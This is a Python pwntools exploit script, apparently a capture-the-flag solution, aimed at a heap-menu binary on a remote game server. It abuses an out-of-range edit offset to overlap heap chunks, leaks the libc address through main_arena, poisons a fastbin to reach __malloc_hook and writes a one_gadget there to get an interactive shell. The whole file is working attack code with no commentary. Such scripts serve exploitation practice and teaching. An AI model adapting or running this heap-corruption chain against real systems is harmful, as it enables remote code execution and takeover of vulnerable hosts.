#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
context.log_level = "critical"
context.binary = "./pwn"
elf = context.binary
#  libc = elf.libc
libc = ELF("./libc.so")
libc.sym['main_arena'] = 0x3c4b20
libc.sym['one_gadget'] = 0xf1147

#  io = process("./pwn", env = {"LD_PRELOAD": "./libc.so"})
io = remote("8sdafgh.gamectf.com", 10001)

def DEBUG():
    success("malloc @ {:#x}".format(0xCA8))
    success("free @ {:#x}".format(0xDFB))
    success("show @ {:#x}".format(0xF30))
    success("edit @ {:#x}".format(0x109B))
    pause()

def add(choice, cont):
    io.sendlineafter("Exit\n", "1")
    io.sendlineafter("Large\n", str(choice))
    io.sendafter("Content:\n", cont)
    sleep(0.01)

def edit(idx, where, cont):
    io.sendlineafter("Exit\n", "2")
    io.sendlineafter("update?\n", str(idx))
    io.sendlineafter("update?\n", str(where))
    io.sendafter("Content:\n", cont)
    sleep(0.01)

def delete(idx):
    io.sendlineafter("Exit\n", "3")
    io.sendlineafter("delete?\n", str(idx))


def show(idx):
    io.sendlineafter("Exit\n", "4")
    io.sendlineafter("view?\n", str(idx))

add(1, '0' * 0x20)
add(2, '1' * 0x30)
add(3, '2' * 0x40)
add(2, '3' * 0x30)
add(3, flat(0x21) * 8)

edit(1, 0x80000000, flat('\0' * 0x18, 0x101, '\n'))
delete(1)

add(2, '4' * 7 + '\n')
show(5)
libc.address = u64(io.recvuntil("\x7f")[-6: ] + '\0\0') - 328 - libc.sym['main_arena']
success("libc @ {:#x}".format(libc.address))

add(3, '5' * 0x40)
add(2, '6' * 0x30)

# 2 6 overlap; 3 7 overlap
delete(2)
edit(6, 0, flat(libc.sym['main_arena'] + 0x10, '\n'))

delete(3)
edit(7, 0, flat(0x51, '\n'))


add(3, '7' * 0x40)
add(2, '8' * 0x30)

#  add(3, cyclic(n = 8, length = 0x40))
add(3, fit({0x38: flat(libc.sym['__malloc_hook'] - 0x23)}, filler = '\0'))

add(1, "/bin/sh\0\n")
#  DEBUG()
#  add(1, cyclic(n = 8, length = 0x20))
add(1, flat('\0' * 19, libc.sym['one_gadget'], '\n'))

io.sendlineafter("Exit\n", "1")
io.sendlineafter("Large\n", '1')

io.interactive()
